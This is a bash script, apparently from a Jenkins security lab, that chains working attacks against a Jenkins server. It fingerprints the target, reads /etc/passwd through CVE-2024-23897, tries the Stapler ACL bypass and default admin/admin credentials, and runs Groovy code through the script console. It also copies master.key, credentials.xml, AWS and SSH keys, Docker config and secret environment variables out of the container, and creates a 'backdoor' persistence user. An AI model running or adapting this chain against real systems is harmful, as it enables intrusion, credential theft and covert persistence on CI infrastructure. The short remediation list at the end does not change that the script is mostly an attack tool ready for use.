#!/bin/bash

echo "=========================================="
echo "  AUTOMATED EXPLOIT CHAIN FRAMEWORK"
echo "=========================================="
echo ""

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
LAB_DIR="$(dirname "$SCRIPT_DIR")"
JENKINS_BREAKER_DIR="$(dirname "$LAB_DIR")"
TARGET="${1:-http://localhost:8080}"
OUTPUT_DIR="/tmp/jenkins-exploit-chain-$$"

# Configuration - can be overridden with environment variables
JENKINS_USER="${JENKINS_USER:-admin}"
JENKINS_PASS="${JENKINS_PASS:-admin}"

mkdir -p "$OUTPUT_DIR"

EXPLOITS_SUCCESS=0
SECRETS_FOUND=0
SHELLS_OBTAINED=0

echo "[+] Target: $TARGET"
echo "[+] Output: $OUTPUT_DIR"
echo ""

echo "[PHASE 1] Reconnaissance & Fingerprinting"
echo "=========================================="
echo ""

echo "[1.1] Probing Jenkins version"
VERSION=$(curl -s -I "$TARGET" 2>/dev/null | grep -i "X-Jenkins:" | awk '{print $2}' | tr -d '\r')
if [[ -z "$VERSION" ]]; then
    VERSION=$(curl -s "$TARGET" 2>/dev/null | grep -o "Jenkins [0-9.]*" | head -1 | awk '{print $2}')
fi
echo "    Version: ${VERSION:-Unknown}"

echo "[1.2] Checking authentication requirements"
AUTH_REQUIRED="false"
curl -s "$TARGET/whoAmI/api/json" 2>/dev/null | grep -q "authenticated" && AUTH_REQUIRED="true"
echo "    Auth Required: $AUTH_REQUIRED"

echo "[1.3] Enumerating installed plugins"
PLUGINS=$(curl -s "$TARGET/pluginManager/api/json?depth=1" 2>/dev/null | grep -o '"shortName":"[^"]*"' | wc -l)
echo "    Plugins Found: $PLUGINS"

echo "[1.4] Identifying vulnerable endpoints"
echo "    Testing CLI endpoint..."
curl -s -I "$TARGET/jnlpJars/jenkins-cli.jar" 2>/dev/null | head -1 | grep -q "200" && echo "      âœ“ CLI jar accessible"

echo "    Testing Script Console..."
curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$TARGET/script" 2>/dev/null | grep -q "script" && echo "      âœ“ Script Console accessible"

echo "    Testing Stapler routing..."
curl -s "$TARGET/securityRealm/user/admin/" 2>/dev/null | grep -q "admin" && echo "      âœ“ Stapler accessible"

echo ""
echo "[PHASE 2] Unauthenticated Exploitation"
echo "======================================="
echo ""

echo "[2.1] Attempting CVE-2024-23897 (CLI File Read)"
if curl -s -I "$TARGET/jnlpJars/jenkins-cli.jar" 2>/dev/null | head -1 | grep -q "200"; then
    curl -s -o "$OUTPUT_DIR/jenkins-cli.jar" "$TARGET/jnlpJars/jenkins-cli.jar" 2>/dev/null
    if [[ -f "$OUTPUT_DIR/jenkins-cli.jar" ]]; then
        echo "    âœ“ CLI jar downloaded: $(ls -lh $OUTPUT_DIR/jenkins-cli.jar | awk '{print $5}')"
        echo "    â†’ Attempting to read /etc/passwd..."
        if command -v java &> /dev/null; then
            java -jar "$OUTPUT_DIR/jenkins-cli.jar" -s "$TARGET" help "@/etc/passwd" 2>&1 | head -10 > "$OUTPUT_DIR/cli-file-read.txt"
            if grep -q "root:" "$OUTPUT_DIR/cli-file-read.txt" 2>/dev/null; then
                echo "    âœ“ File read successful!"
                EXPLOITS_SUCCESS=$((EXPLOITS_SUCCESS + 1))
            fi
        else
            echo "    âš  Java not installed, skipping CLI exploitation"
        fi
    fi
fi

echo "[2.2] Attempting CVE-2018-1000861 (Stapler ACL Bypass)"
STAPLER_RESULT=$(curl -s "$TARGET/securityRealm/user/admin/search/index?q=a" 2>/dev/null)
if echo "$STAPLER_RESULT" | grep -q "admin"; then
    echo "    âœ“ Stapler ACL bypass successful"
    echo "$STAPLER_RESULT" > "$OUTPUT_DIR/stapler-bypass.html"
    EXPLOITS_SUCCESS=$((EXPLOITS_SUCCESS + 1))
fi

echo ""
echo "[PHASE 3] Authenticated Exploitation"
echo "===================================="
echo ""

CREDS="$JENKINS_USER:$JENKINS_PASS"

echo "[3.1] Testing credentials"
if curl -s -u "$CREDS" "$TARGET/api/json" 2>/dev/null | grep -q '"mode"'; then
    echo "    âœ“ Credentials work: $JENKINS_USER"
    EXPLOITS_SUCCESS=$((EXPLOITS_SUCCESS + 1))
else
    echo "    âœ— Credentials failed"
    CREDS=""
fi

if [[ -n "$CREDS" ]]; then
    echo "[3.2] Executing CVE-2019-1003029 (Groovy RCE)"
    GROOVY_PAYLOAD='println("EXPLOIT_SUCCESS"); println("Hostname: " + InetAddress.getLocalHost().getHostName()); println("User: " + System.getProperty("user.name")); println("Java: " + System.getProperty("java.version"))'
    
    GROOVY_RESULT=$(curl -s -u "$CREDS" "$TARGET/script" \
        -d "script=${GROOVY_PAYLOAD}" 2>/dev/null)
    
    if echo "$GROOVY_RESULT" | grep -q "EXPLOIT_SUCCESS"; then
        echo "    âœ“ Groovy RCE successful!"
        echo "$GROOVY_RESULT" > "$OUTPUT_DIR/groovy-rce.txt"
        EXPLOITS_SUCCESS=$((EXPLOITS_SUCCESS + 1))
        SHELLS_OBTAINED=$((SHELLS_OBTAINED + 1))
    fi

    echo "[3.3] Dumping Jenkins configuration"
    curl -s -u "$CREDS" "$TARGET/api/json?pretty=true" 2>/dev/null > "$OUTPUT_DIR/jenkins-config.json"
    if [[ -f "$OUTPUT_DIR/jenkins-config.json" ]]; then
        echo "    âœ“ Configuration dumped: $(wc -l < $OUTPUT_DIR/jenkins-config.json) lines"
    fi

    echo "[3.4] Enumerating jobs"
    JOBS=$(curl -s -u "$CREDS" "$TARGET/api/json?tree=jobs[name]" 2>/dev/null | grep -o '"name":"[^"]*"' | cut -d'"' -f4)
    JOB_COUNT=$(echo "$JOBS" | grep -c .)
    echo "    âœ“ Jobs found: $JOB_COUNT"
    echo "$JOBS" > "$OUTPUT_DIR/jobs.txt"

    echo "[3.5] Enumerating users"
    USERS=$(curl -s -u "$CREDS" "$TARGET/asynchPeople/api/json" 2>/dev/null | grep -o '"fullName":"[^"]*"')
    echo "$USERS" > "$OUTPUT_DIR/users.txt"
    echo "    âœ“ Users enumerated"
fi

echo ""
echo "[PHASE 4] Secrets Harvesting"
echo "============================"
echo ""

if docker ps 2>/dev/null | grep -q jenkins-lab; then
    CONTAINER=$(docker ps --filter "name=jenkins" --format "{{.Names}}" | head -n 1)
    echo "[+] Container found: $CONTAINER"
    
    echo "[4.1] Extracting master.key"
    docker exec "$CONTAINER" cat /var/jenkins_home/secrets/master.key 2>/dev/null > "$OUTPUT_DIR/master.key"
    [[ -s "$OUTPUT_DIR/master.key" ]] && echo "    âœ“ master.key extracted" && SECRETS_FOUND=$((SECRETS_FOUND + 1))
    
    echo "[4.2] Extracting hudson.util.Secret"
    docker exec "$CONTAINER" cat /var/jenkins_home/secrets/hudson.util.Secret 2>/dev/null > "$OUTPUT_DIR/hudson.util.Secret"
    [[ -s "$OUTPUT_DIR/hudson.util.Secret" ]] && echo "    âœ“ hudson.util.Secret extracted" && SECRETS_FOUND=$((SECRETS_FOUND + 1))
    
    echo "[4.3] Extracting credentials.xml"
    docker exec "$CONTAINER" cat /var/jenkins_home/credentials.xml 2>/dev/null > "$OUTPUT_DIR/credentials.xml"
    if [[ -s "$OUTPUT_DIR/credentials.xml" ]]; then
        CRED_COUNT=$(grep -c "entry>" "$OUTPUT_DIR/credentials.xml" 2>/dev/null || echo 0)
        echo "    âœ“ credentials.xml extracted ($CRED_COUNT entries)"
        SECRETS_FOUND=$((SECRETS_FOUND + CRED_COUNT))
    fi
    
    echo "[4.4] Searching for AWS credentials"
    docker exec "$CONTAINER" cat /home/jenkins/.aws/credentials 2>/dev/null > "$OUTPUT_DIR/aws-credentials"
    if grep -q "aws_access_key_id" "$OUTPUT_DIR/aws-credentials" 2>/dev/null; then
        echo "    âœ“ AWS credentials found"
        SECRETS_FOUND=$((SECRETS_FOUND + 1))
    fi
    
    echo "[4.5] Searching for SSH keys"
    docker exec "$CONTAINER" cat /home/jenkins/.ssh/id_rsa 2>/dev/null > "$OUTPUT_DIR/id_rsa"
    if grep -q "BEGIN RSA PRIVATE KEY" "$OUTPUT_DIR/id_rsa" 2>/dev/null; then
        echo "    âœ“ SSH private key found"
        SECRETS_FOUND=$((SECRETS_FOUND + 1))
    fi
    
    echo "[4.6] Searching environment variables"
    docker exec "$CONTAINER" printenv 2>/dev/null | grep -i "key\|token\|pass\|secret" > "$OUTPUT_DIR/env-secrets.txt"
    ENV_SECRETS=$(wc -l < "$OUTPUT_DIR/env-secrets.txt")
    echo "    âœ“ Environment secrets: $ENV_SECRETS found"
    SECRETS_FOUND=$((SECRETS_FOUND + ENV_SECRETS))
    
    echo "[4.7] Searching for Docker secrets"
    docker exec "$CONTAINER" cat /home/jenkins/.docker/config.json 2>/dev/null > "$OUTPUT_DIR/docker-config.json"
    [[ -s "$OUTPUT_DIR/docker-config.json" ]] && echo "    âœ“ Docker config found" && SECRETS_FOUND=$((SECRETS_FOUND + 1))
    
    echo "[4.8] Checking sudo privileges"
    SUDO_PERMS=$(docker exec "$CONTAINER" sudo -l 2>/dev/null)
    echo "$SUDO_PERMS" > "$OUTPUT_DIR/sudo-permissions.txt"
    if echo "$SUDO_PERMS" | grep -q "NOPASSWD"; then
        echo "    âœ“ NOPASSWD sudo found!"
        SECRETS_FOUND=$((SECRETS_FOUND + 1))
    fi
fi

echo ""
echo "[PHASE 5] Post-Exploitation"
echo "==========================="
echo ""

if [[ -n "$CREDS" ]]; then
    echo "[5.1] Creating persistence backdoor"
    BACKDOOR_PAYLOAD='import jenkins.model.*; import hudson.model.*; def user = User.get("backdoor"); user.setFullName("System Account"); user.save(); println("Backdoor user created")'
    
    BACKDOOR_RESULT=$(curl -s -u "$CREDS" "$TARGET/scriptText" \
        -d "script=${BACKDOOR_PAYLOAD}" 2>/dev/null)
    echo "$BACKDOOR_RESULT" > "$OUTPUT_DIR/backdoor.txt"
    echo "    âœ“ Persistence attempted"
    
    echo "[5.2] Enumerating build history"
    curl -s -u "$CREDS" "$TARGET/api/json?tree=jobs[name,builds[number,result]]" 2>/dev/null > "$OUTPUT_DIR/build-history.json"
    echo "    âœ“ Build history extracted"
    
    echo "[5.3] Extracting job configurations"
    mkdir -p "$OUTPUT_DIR/jobs"
    for job in $(cat "$OUTPUT_DIR/jobs.txt" 2>/dev/null); do
        curl -s -u "$CREDS" "$TARGET/job/$job/config.xml" 2>/dev/null > "$OUTPUT_DIR/jobs/${job}.xml"
    done
    JOB_CONFIGS=$(ls "$OUTPUT_DIR/jobs/" 2>/dev/null | wc -l)
    echo "    âœ“ Job configs extracted: $JOB_CONFIGS"
fi

echo ""
echo "[PHASE 6] Generating Reports"
echo "============================"
echo ""

cat > "$OUTPUT_DIR/EXPLOIT_REPORT.txt" << EOF
========================================
  JENKINS EXPLOITATION REPORT
========================================

Target: $TARGET
Timestamp: $(date)
Jenkins Version: ${VERSION:-Unknown}

EXPLOITATION SUMMARY
====================
Exploits Successful: $EXPLOITS_SUCCESS
Secrets Found: $SECRETS_FOUND
Shells Obtained: $SHELLS_OBTAINED

ATTACK CHAIN
============
1. Reconnaissance
   - Version fingerprinting
   - Plugin enumeration
   - Endpoint discovery

2. Initial Access
   - CVE-2024-23897 (CLI File Read)
   - CVE-2018-1000861 (Stapler Bypass)
   - Default credentials

3. Code Execution
   - CVE-2019-1003029 (Groovy RCE)
   - Script Console access

4. Secrets Extraction
   - Jenkins master.key
   - Encrypted credentials
   - AWS credentials
   - SSH keys
   - Docker credentials
   - Environment variables

5. Post-Exploitation
   - Persistence mechanisms
   - Configuration extraction
   - Build history analysis

EXTRACTED FILES
===============
$(ls -lh "$OUTPUT_DIR" | tail -n +2)

RECOMMENDATIONS
===============
1. Update Jenkins to latest version
2. Disable Script Console for non-admins
3. Implement strong authentication
4. Rotate all credentials
5. Enable audit logging
6. Restrict CLI access
7. Implement network segmentation

========================================
EOF

echo "    âœ“ Exploit report generated"

cat > "$OUTPUT_DIR/CREDENTIALS.txt" << EOF
========================================
  EXTRACTED CREDENTIALS
========================================

Master Key: $(test -f "$OUTPUT_DIR/master.key" && echo "âœ“ Extracted" || echo "âœ— Not found")
Hudson Secret: $(test -f "$OUTPUT_DIR/hudson.util.Secret" && echo "âœ“ Extracted" || echo "âœ— Not found")
Credentials XML: $(test -f "$OUTPUT_DIR/credentials.xml" && echo "âœ“ Extracted" || echo "âœ— Not found")
AWS Credentials: $(test -f "$OUTPUT_DIR/aws-credentials" && echo "âœ“ Extracted" || echo "âœ— Not found")
SSH Key: $(test -f "$OUTPUT_DIR/id_rsa" && echo "âœ“ Extracted" || echo "âœ— Not found")
Docker Config: $(test -f "$OUTPUT_DIR/docker-config.json" && echo "âœ“ Extracted" || echo "âœ— Not found")

Total Secrets: $SECRETS_FOUND
========================================
EOF

echo "    âœ“ Credentials report generated"

echo ""
echo "=========================================="
echo "         EXPLOITATION SUMMARY"
echo "=========================================="
echo ""
echo "âœ… Exploits Successful: $EXPLOITS_SUCCESS"
echo "ðŸ”‘ Secrets Found: $SECRETS_FOUND"
echo "ðŸš Shells Obtained: $SHELLS_OBTAINED"
echo ""
echo "ðŸ“ Output Directory: $OUTPUT_DIR"
echo ""
echo "Key Files:"
echo "  - EXPLOIT_REPORT.txt"
echo "  - CREDENTIALS.txt"
echo "  - groovy-rce.txt"
echo "  - jenkins-config.json"
echo "  - jobs/"
echo ""
echo "Next Steps:"
echo "  1. Review $OUTPUT_DIR/EXPLOIT_REPORT.txt"
echo "  2. Decrypt credentials with offsec-jenkins"
echo "  3. Analyze job configurations for secrets"
echo "  4. Test lateral movement opportunities"
echo ""
